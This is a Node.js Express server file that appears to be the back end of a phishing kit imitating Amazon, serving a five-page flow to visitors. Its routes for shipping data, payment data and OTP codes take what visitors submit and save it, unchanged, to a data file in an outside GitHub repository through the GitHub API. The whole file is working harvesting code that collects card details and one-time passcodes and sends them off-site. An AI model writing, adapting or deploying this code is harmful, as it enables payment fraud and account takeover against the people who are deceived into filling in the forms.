const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات GitHub ==========
const GITHUB_TOKEN = process.env.GITHUB_TOKEN;
const REPO_OWNER = 'afffaaaa28-glitch';
const REPO_NAME = 'amazon-form-site';
const FILE_PATH = 'data.txt';

if (!GITHUB_TOKEN) {
    console.error('❌ GITHUB_TOKEN not set!');
}

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// ========== Serve static files ==========
app.use(express.static(path.join(__dirname, 'views')));

// ========== Helper: Save to GitHub ==========
async function saveToGitHub(data) {
    if (!GITHUB_TOKEN) {
        console.error('❌ No GitHub token!');
        return;
    }
    
    const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
    const content = Buffer.from(data + '\n---\n').toString('base64');

    let sha = '';
    try {
        const getRes = await fetch(url, {
            headers: { Authorization: `token ${GITHUB_TOKEN}` }
        });
        if (getRes.ok) {
            const fileInfo = await getRes.json();
            sha = fileInfo.sha;
        }
    } catch (err) {
        console.log('📄 File not found, creating new...');
    }

    const body = {
        message: `Update - ${new Date().toISOString()}`,
        content: content,
        sha: sha
    };

    const res = await fetch(url, {
        method: 'PUT',
        headers: {
            Authorization: `token ${GITHUB_TOKEN}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
    });

    if (!res.ok) {
        const errorText = await res.text();
        throw new Error(`GitHub API error: ${res.status} - ${errorText}`);
    }
    return await res.json();
}

// ========== Routes ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page1.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page3.html'));
});

app.get('/page4', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page4.html'));
});

app.get('/page5', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'page5.html'));
});

app.post('/submit-data', async (req, res) => {
    try {
        const data = JSON.stringify(req.body, null, 2);
        await saveToGitHub(`========== SHIPPING DATA ==========\n${data}`);
        console.log('✅ Data saved to GitHub');
        res.redirect('/page3');
    } catch (err) {
        console.error('❌ Error:', err.message);
        res.status(500).send('Error saving data: ' + err.message);
    }
});

app.post('/submit-payment', async (req, res) => {
    try {
        const data = JSON.stringify(req.body, null, 2);
        await saveToGitHub(`========== PAYMENT DATA ==========\n${data}`);
        console.log('✅ Payment saved to GitHub');
        res.redirect('/page4');
    } catch (err) {
        console.error('❌ Error:', err.message);
        res.status(500).send('Error saving payment: ' + err.message);
    }
});

app.post('/submit-otp', async (req, res) => {
    try {
        const data = JSON.stringify(req.body, null, 2);
        await saveToGitHub(`========== OTP DATA ==========\n${data}`);
        console.log('✅ OTP saved to GitHub');
        res.redirect('/page5');
    } catch (err) {
        console.error('❌ Error:', err.message);
        res.status(500).send('Error saving OTP: ' + err.message);
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
